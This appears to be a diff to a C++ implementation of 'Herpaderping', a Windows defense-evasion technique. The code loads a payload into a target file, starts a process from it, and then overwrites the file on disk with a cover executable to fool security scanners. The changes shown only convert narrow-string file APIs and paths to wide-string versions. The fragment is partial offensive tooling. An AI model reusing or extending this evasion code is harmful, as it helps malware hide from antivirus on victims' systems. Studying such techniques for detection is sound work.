@@ -5,9 +5,9 @@
 constexpr auto PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;
 constexpr auto TARGET_PROCESS_TITLE = L"You have been hack3d!";
 
-Herpaderping::Herpaderping(std::string path_to_source, 
-						   std::string path_to_target, 
-						   std::string path_to_cover,
+Herpaderping::Herpaderping(std::wstring path_to_source, 
+						   std::wstring path_to_target, 
+						   std::wstring path_to_cover,
 						   const wchar_t* windows_station_to_run_on) :
 	m_windows_station_to_run_on(windows_station_to_run_on),
 	m_section_handle(std::make_unique<HandleGuard>()),
@@ -36,7 +36,7 @@ void Herpaderping::run_process_with_cover()
 
 void Herpaderping::read_source_payload()
 {
-	HANDLE source_file = CreateFileA(this->m_path_to_source.c_str(),
+	HANDLE source_file = CreateFileW(this->m_path_to_source.c_str(),
 		GENERIC_READ,
 		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
 		nullptr,
@@ -61,7 +61,7 @@ void Herpaderping::read_source_payload()
 void Herpaderping::create_target_file_and_write_payload()
 {
 	HANDLE tmp_target_file = nullptr;
-	tmp_target_file = CreateFileA(m_path_to_target.c_str(),
+	tmp_target_file = CreateFileW(m_path_to_target.c_str(),
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		nullptr,
@@ -120,7 +120,7 @@ void Herpaderping::create_target_process()
 void Herpaderping::cover_target_file()
 {
 	// Open and read target executable file.
-	HANDLE cover_file_handle = CreateFileA(this->m_path_to_cover.c_str(),
+	HANDLE cover_file_handle = CreateFileW(this->m_path_to_cover.c_str(),
 		GENERIC_READ,
 		0,
 		nullptr,
@@ -172,10 +172,10 @@ void Herpaderping::create_and_run_target_main_thread()
 	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);
 
 	// Initialize relevant parameters.
-	m_ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(m_path_to_target).c_str());
-	m_ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + m_path_to_target + "\"").c_str());
+	m_ntdll_functions->RtlInitUnicodeString(&image_path_name, m_path_to_target.c_str());
+	m_ntdll_functions->RtlInitUnicodeString(&command_line, std::wstring(L"\"" + m_path_to_target + L"\"").c_str());
 	m_ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
-	m_ntdll_functions->RtlInitUnicodeString(&desktop_info, m_windows_station_to_run_on);
+	m_ntdll_functions->RtlInitUnicodeString(&desktop_info, m_windows_station_to_run_on.c_str());
 
 	m_ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
 		&image_path_name,
